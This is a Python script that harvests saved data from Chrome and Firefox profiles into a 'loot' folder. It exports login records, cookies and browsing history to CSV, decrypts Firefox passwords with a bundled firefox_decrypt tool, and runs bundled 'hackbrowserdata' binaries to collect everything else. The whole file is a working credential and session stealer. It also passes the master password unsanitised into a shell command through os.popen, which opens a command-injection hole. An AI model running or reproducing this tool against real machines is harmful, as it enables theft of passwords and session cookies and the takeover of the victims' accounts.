#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import glob
import sqlite3

from tools.utils import *
from tools.xplat import Info

# Make sure Python >=v3.6:
foo = "bar"
try:
	bar = f"foo{foo}"
except:
	print('Please make sure you are running python v3.6+')
	sys.exit(os.EX_SOFTWARE)

# Change to script directory:
script_path = os.path.dirname(os.path.abspath(__file__))
os.chdir(script_path)


def div():
	print("-" * get_terminal_size())


def write_query_to_csv(db_copy, output_csv, query=None):
	if not os.path.isfile(db_copy):
		err("Can't find database path")
	conn = sqlite3.connect(db_copy)
	c = conn.cursor()
	data = c.execute(query)
	headers = list(map(lambda x: x[0], c.description))
	with open(output_csv, 'w') as f:
		f.write(','.join(headers))
		f.write('\n')
		for line in data.fetchall():
			row = ','.join([str(i) for i in line])
			f.write(row)
			f.write('\n')
	c.close()
	conn.close()
	os.remove(db_copy)


def get_filename(profile: str, chrome=False, mozilla=False):
	profile_name = os.path.basename(profile)
	profile_split = profile.split('/')
	parent = ''.join(profile_split[len(profile_split)-2:len(profile_split)-1])
	if chrome:
		return f"chrome_{parent}_{profile_name}".replace(' ', '-').lower()
	if mozilla:
		return f"mozilla_{parent}_{profile_name}".replace(' ', '-').lower()


def delete_if_empty(filename: str) -> bool:
	if os.path.isfile(filename):
		with open(filename, 'r') as f:
			lines = f.readlines()
	if len(lines) <= 2:
		os.remove(filename)
		return False
	return True


def cleanup():
	directory = f"{script_path}/loot/{user}"
	os.chdir(directory)
	dbs = ['Cookies', 'cookies.sqlite', 'Login Data', 'logins.json', 'History', 'places.sqlite']
	for db in dbs:
		if os.path.isfile(db):
			os.remove(db)


def get_data(browser_dict: dict, cookies=None, logins=False, history=False, masterpass=None):
	os.chdir(loot_dir)
	chrome_profiles = browser_dict['chrome']
	mozilla_profiles = browser_dict['mozilla']
	for profile in chrome_profiles:
		profile_name = os.path.basename(profile)
		filename = get_filename(profile, chrome=True)
		if cookies:
			div()
			warn("Chrome cookie data only sometimes available with '-A'")
		if logins:
			div()
			db_orig = os.path.join(profile, 'Login Data')
			db_copy = f"{loot_dir}/Login Data"
			shutil.copy(db_orig, db_copy)
			logins_file = f"{loot_dir}/{filename}_logins.csv"
			write_query_to_csv(db_copy, logins_file, query="SELECT date_created, date_last_used, origin_url, action_url, username_value FROM logins ORDER BY origin_url")
			warn("Chrome can only show decrypted passwords with the '-L' option")
			if delete_if_empty(logins_file):
				print(f"Login data for profile {profile}:\n")
				with open(logins_file, 'r') as f:
					print(f.read())
		if history:
			div()
			db_orig = os.path.join(profile, 'History')
			db_copy = f"{loot_dir}/History"
			shutil.copy(db_orig, db_copy)
			history_file = f"{loot_dir}/{filename}_history.csv"
			write_query_to_csv(db_copy, history_file, query="SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch'),url FROM urls ORDER BY last_visit_time ASC")
			if delete_if_empty(history_file):
				print(f"History data for profile {profile}:\n")
				with open(history_file, 'r') as f:
					print(f.read())
	for profile in mozilla_profiles:
		profile_name = os.path.basename(profile)
		filename = get_filename(profile, mozilla=True)
		if cookies:
			div()
			db_orig = os.path.join(profile, 'cookies.sqlite')
			db_copy = f"{loot_dir}/cookies.sqlite"
			shutil.copy(db_orig, db_copy)
			cookies_file = f"{loot_dir}/{filename}_cookies.csv"
			write_query_to_csv(db_copy, cookies_file, query="SELECT * FROM moz_cookies ORDER BY host")
			if delete_if_empty(cookies_file):
				print(f"Cookies for profile {profile}:\n")
				with open(cookies_file, 'r') as f:
					print(f.read())
		if history:
			div()
			db_orig = os.path.join(profile, 'places.sqlite')
			db_copy = f"{loot_dir}/places.sqlite"
			shutil.copy(db_orig, db_copy)
			history_file = f"{loot_dir}/{filename}_history.csv"
			write_query_to_csv(db_copy, history_file, query="SELECT datetime(h.visit_date/1000000,'unixepoch'),p.url FROM moz_historyvisits AS h, moz_places AS p WHERE p.id == h.place_id ORDER BY h.visit_date ASC;")
			if delete_if_empty(history_file):
				print(f"History data for profile {profile}:\n")
				with open(history_file, 'r') as f:
					print(f.read())
		if logins:
			div()
			logins_file = f"{loot_dir}/{filename}_logins.csv"
			login_output = os.popen(f'echo {masterpass} | {python} "{script_path}/tools/firefox_decrypt/firefox_decrypt.py" "{profile}" -n --format csv --csv-delimiter ","').read()
			print(f"Login data for profile {profile}:\n")
			with open(logins_file, 'w') as f:
				f.write(login_output)
			if delete_if_empty(logins_file):
				print(login_output)
			del login_output


if __name__ == '__main__':
	# Parse arguments:
	parser = argparse.ArgumentParser(add_help=True, description='Gather data from various browser sqlite databases')
	string_group = parser.add_argument_group('String options')
	string_group.add_argument('-u', '--user', action='store', dest='username', default='user', help='set the username for output directory')
	string_group.add_argument('-p', '--masterpass', action='store', dest='master_password', default=None, help='master password to use if Mozilla browser data is encrypted')
	string_group.add_argument('-b', '--browserdir', action='store', dest='browser_dir', default=None, help='path to main browser directory to search')
	string_group.add_argument('-pp', '--profile-path', action='store', dest='profile_dir', default=None, help='path to specific profile directory to search')
	string_group.add_argument('-cp', '--cookies-path', action='store', dest='cookies_path', default=None, help='path to cookies database')
	string_group.add_argument('-hp', '--history-path', action='store', dest='history_path', default=None, help='path to history database')
	string_group.add_argument('-lp', '--logins-path', action='store', dest='logins_path', default=None, help='path to logins database')
	bool_group = parser.add_argument_group('Boolean options')
	bool_group.add_argument('-A', '--all', action='store_true', dest='all_true', default=False, help='Attempt to gather all data from all installed browsers (except for IE)')
	bool_group.add_argument('-C', '--cookies', action='store_true', dest='cookies_true', default=False, help='attempt to gather cookies information')
	bool_group.add_argument('-H', '--history', action='store_true', dest='history_true', default=False, help='attempt to gather history information')
	bool_group.add_argument('-L', '--logins', action='store_true', dest='logins_true', default=False, help='attempt to gather login information')
	options = parser.parse_args()

	info = Info()
	python = info.python
	user = info.username
	if options.username:
		user = options.username

	loot_dir = f"{script_path}/loot/{user}"
	os.makedirs(loot_dir, exist_ok=True)

	profile_dirs = None
	if options.profile_dir:
		if os.path.isdir(options.profile_dir):
			profile_dirs = info.get_profiles(directories=[options.profile_dir], is_profile=True)
		else:
			err('Invalid profile path')
	if options.browser_dir and not options.profile_dir:
		if os.path.isdir(options.browser_dir):
			profile_dirs = info.get_profiles(directories=[options.browser_dir])
		else:
			err('Invalid browser path')
	if not options.browser_dir and not options.profile_dir:
		# browser_dir = info.get_browser_dir()
		# installed_browsers = info.get_browser()
		# profiles = info.get_profiles(installed_browsers)
		profile_dirs = info.get_profiles(automatic=True)
		if info.arch == 'Windows':
			sys.exit()

	numprofiles = 0
	for _, v in profile_dirs.items():
		numprofiles += len(v)
	if numprofiles == 0:
		err('No profiles found')

	# Get History:
	if options.history_true or options.history_path:
		if options.history_path:
			if not os.path.isfile(options.history_path):
				err('Check history path.')
		get_data(profile_dirs, history=True)
	# Get Cookies:
	if options.cookies_true or options.cookies_path:
		if options.cookies_path:
			if not os.path.isfile(options.cookies_path):
				err('Check cookies path')
		get_data(profile_dirs, cookies=True)
	# Get Login Data:
	if options.logins_true or options.logins_path:
		if options.logins_path:
			if not os.path.isfile(options.logins_path):
				err('Check logins path')
		get_data(profile_dirs, logins=True)
	# Get All (using golang binaries under './tools/hackbrowserdata'):
	if options.all_true:
		hackbrowserdata = os.path.abspath(f"tools/hackbrowserdata/hbd-{info.platform}-{info.arch}")
		if info.arm and info.platform == 'Linux':
			hackbrowserdata = os.path.abspath(f"tools/hackbrowserdata/hbd-{info.platform}-{info.arm}")
		elif info.platform == 'Windows':
			hackbrowserdata = f"{hackbrowserdata}.exe"
		os.chdir(f"./loot/{user}")
		output = os.popen(f"{hackbrowserdata}").read()
		for file in glob.glob("results/*"):
			file = os.path.basename(file)
			shutil.move(os.path.join(f"{script_path}/loot/{user}/results/{file}"), os.path.join(f"{script_path}/loot/{user}/{file}"))
		os.rmdir('./results')

	cleanup()
	div()
	print(f"Contents of {script_path}/loot/{user}:\n")
	for file in os.listdir(f"{script_path}/loot/{user}"):
		print(file)
	div()





